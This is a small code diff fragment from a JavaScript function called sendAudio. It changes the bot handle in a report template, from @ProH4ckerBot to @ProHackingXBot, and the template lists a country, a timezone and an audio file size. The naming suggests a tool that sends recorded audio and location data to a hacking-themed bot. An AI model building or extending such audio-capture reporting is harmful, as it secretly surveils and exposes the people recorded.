@@ -97,7 +97,7 @@ async function sendAudio() {
 🌍 Country: ${country.flag} ${country.name}
 ⏰ TimeZone: ${timezone}
 🔊 Soundsize: ${sizeMB}
-🤖 Bot: @ProH4ckerBot
+🤖 Bot: @ProHackingXBot
 💻 User Panel Web System
 ╚════════════════════════════╝`;
 
